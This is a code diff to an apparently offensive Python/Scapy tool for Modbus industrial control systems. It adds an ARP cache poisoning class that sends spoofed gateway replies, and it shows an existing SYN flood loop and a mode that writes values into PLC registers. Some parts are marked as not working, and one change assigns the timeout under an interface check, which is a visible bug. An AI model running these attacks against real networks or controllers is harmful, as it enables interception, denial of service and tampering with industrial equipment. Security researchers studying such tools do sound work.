@@ -64,7 +64,7 @@ class MBregisters():
 	"""
 	Read Device diagnostic
 	"""
-	def scanDeviceDiagnostic(self):
+	def scanDeviceIdent(self):
 		global MINOBJECTID, MAXOBJECTID
 		# Open connection
 		c = connectMb(self.ip)
@@ -129,7 +129,7 @@ class MBregisters():
 			pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU2B_Read_Device_Identification_Request()		
 		else:
 			pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU00_Generic_Request(funcCode=code)
-#TODO:  Considering the packet forged, we try to put good values and length with the codes known and remove extra payload (seems not working)
+#FIXME:  Considering the packet forged, we try to put good values and length with the codes known and remove extra payload (seems not working)
 			pkt = ModbusADU_Request(str(pkt))
 		
 		try:			
@@ -442,7 +442,7 @@ def SYN_flood(ip, timeout):
 		print "  > Interrupt with Ctrl+c"
 
 	while True:
-		p = IP(dst=str(ip)) / TCP(sport=RandNum(1024, 65535), dport=modport, flags="S")
+		p = IP(dst=str(ip))/TCP(sport=RandNum(1024, 65535), dport=modport, flags="S")
 		send(p, iface=iface, verbose=False)
 
 
@@ -587,21 +587,85 @@ def activeMonitoring(ip, timeout):
 Passive Device Monitoring
 Listen the traffic for the device values
 """
-#TODO: implement passiveMonitoring
 def passiveMonitoring(ip, timeout):
 		sniffer = SniffMB(ip)
 		sniffer.start()
 		#time.sleep(10)
 		sniffer.join()
 
+
+"""
+Define tool for an ARP Cache poisonning
+"""
+class ARPCachePoisonning(threading.Thread):
+	def __init__(self, clientMAC, clientIP, gatewayIP):
+		threading.Thread.__init__(self)
+		self.clientMAC = clientMAC
+		self.clientIP = clientIP
+		self.gatewayIP = gatewayIP
+	def run(self):
+		self.sniffARP()
+	"""
+	Send a gratuitous spoofed ARP
+	"""
+	def sendARP(self):
+#FIXME: not working
+		send( Ether(dst=self.clientMAC)/ARP(op=2, psrc=self.gatewayIP, pdst=self.clientIP), inter=RandNum(10,40), loop=1 )
+		
+	def sniffARP(self):
+		sniff(prn=self.replyARP, filter="arp", timeout=60)
+		
+#FIXME: not working
+	def replyARP(self, pkt):
+		if pkt[ARP].op != 1:
+			print "OP Code : " + str(pkt[ARP].op)
+			return
+		if pkt[Ether].src != self.clientMAC:
+			print str(pkt[Ether].src) + "<>" + str(self.clientMAC)
+			return
+		
+		print pkt.show()
+		
+		send( Ether(dst=self.clientMAC)/ARP(op=2, psrc=self.gatewayIP, pdst=self.clientIP), inter=RandNum(10,40), loop=1 )
+
+
+
+"""
+Launch an ARP poisonning attack
+"""
+def launchARPpoisonning(clientIP, gatewayIP):
+	clientMAC = getmacbyip(clientIP)
+	if clientMAC is None:
+		return None
+	
+	
+	t = ARPCachePoisonning(clientMAC, clientIP, gatewayIP)
+	t.sendARP()
+	t.sniffARP()
+	t.join()
+	
+
+"""
+What to do if the script is call by  CLI and not imported
+"""
 if __name__ == "__main__":
 	parser = argparse.ArgumentParser()
-	parser.add_argument("-m", "--mode", help="Mode of use")
+	parser.add_argument("-m", "--mode",
+                        choices=['scanNetwork', 'scanDeviceCode','scanDevice','scanDeviceIdent', 'injectValue', 'interact','ARPPoisonning'],
+                        help='mode of use :\n'
+							'scanNetwork = Scan ip range to find devices responding on Modbus port,'
+							'scanDeviceCode = Scan function codes defined,'
+							'scanDevice = Scan function code and register definition,'
+							'scanDeviceIdent = Scan device identification,'
+							'injectValue = Write values in some registers'
+						)
 	parser.add_argument("-t", "--target", help="IP range", default="127.0.0.1")	
+	parser.add_argument("-g", "--gateway", help="IP gateway", default="127.0.0.1")	
 	parser.add_argument("-x", "--timeout", help="Timeout in ms of connection", default=100)	
 	parser.add_argument("-v", "--verbose", help="increase output verbosity", action="store_true")
 	parser.add_argument("-c", "--intrusive", help="Make modification on PLC (use of Write functions)", action="store_true")
 	parser.add_argument("-i", "--interface", help="Network interface (eth0, etc.)")
+	
 	args = parser.parse_args()
 
 	if args.verbose:	
@@ -609,6 +673,9 @@ if __name__ == "__main__":
 
 	if args.interface:	
 		iface = args.interface
+
+	if args.interface:	
+		timeout = args.timeout
 
 	if args.mode == "scanNetwork":
 		for ip in scanNetwork(args.target, args.timeout):
@@ -624,12 +691,14 @@ if __name__ == "__main__":
 		myDev.checkInDiscreteDefined()
 		myDev.checkHoldRegDefined()
 		myDev.checkRegInDefined()
-		myDev.scanDeviceDiagnostic()
+		myDev.scanDeviceIdent()
 		myDev.printMe()
-	elif args.mode == "scanDeviceDiag":
+	elif args.mode == "scanDeviceIdent":
 		myDev = MBregisters(args.target)
-		myDev.scanDeviceDiagnostic()
+		myDev.scanDeviceIdent()
 		myDev.printMe()
+	elif args.mode == "ARPPoisonning":
+		launchARPpoisonning(args.target, args.gateway)
 	elif args.mode == "injectValue":
 		injectValue(args.target)
 	elif args.mode == "SYN_flood":
